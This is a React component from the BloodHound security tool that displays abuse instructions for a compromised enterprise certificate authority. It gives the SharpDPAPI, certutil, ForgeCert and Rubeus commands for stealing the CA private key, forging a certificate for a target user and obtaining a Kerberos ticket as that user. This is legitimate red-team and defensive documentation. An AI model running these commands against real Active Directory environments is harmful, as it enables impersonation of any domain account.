// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body1'>
                Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)
            </Typography>
            <Typography variant='body2'>
                1) Open certsrv.msc as Administrator on the enterprise CA host.
                <br />
                2) Right-click on the enterprise CA and select "All Tasks" followed by "Back up CA...".
                <br />
                3) Click "Next", select "Private key and CA certificate", and select the location folder.
                <br />
                4) Click "Next", and set a password.
                <br />
                5) Click "Next" and click "Finish" to back up the certificate as a .p12 file.
            </Typography>
            <Typography variant='body1'>Obtain CA certificate incl. private key - using commandline tools</Typography>
            <Typography variant='body2'>
                1) Print all certificates of the host using SharpDPAPI:
                <Typography component={'pre'}>{'SharpDPAPI.exe certificates /machine'}</Typography>
                The enterprise CA certificate is the one where issuer and subject are identical.
                <br />
                <br />
                2) Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the
                same folder.
                <br />
                3) Create a .pfx version of the CA certificate using certutil:
                <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
                <br />
                4) Set password when prompted.
            </Typography>
            <Typography variant='body1'>Forge certificate and obtain a TGT as targeted principal</Typography>
            <Typography variant='body2'>
                1) Forge a certificate of a target principal using ForgeCert:
                <Typography component={'pre'}>
                    {
                        'ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "password123!" --Subject "CN=User" --SubjectAltName "roshi@dumpster.fire" --NewCertPath target.pfx --NewCertPassword "NewPassword123!"'
                    }
                </Typography>
                <br />
                2) Request a TGT for the targeted principal using the certificate with Rubeus:
                <Typography component={'pre'}>
                    {'Rubeus.exe asktgt /user:Roshi /certificate:target.pfx /password:NewPassword123!'}
                </Typography>
            </Typography>
        </>
    );
};

export default Abuse;
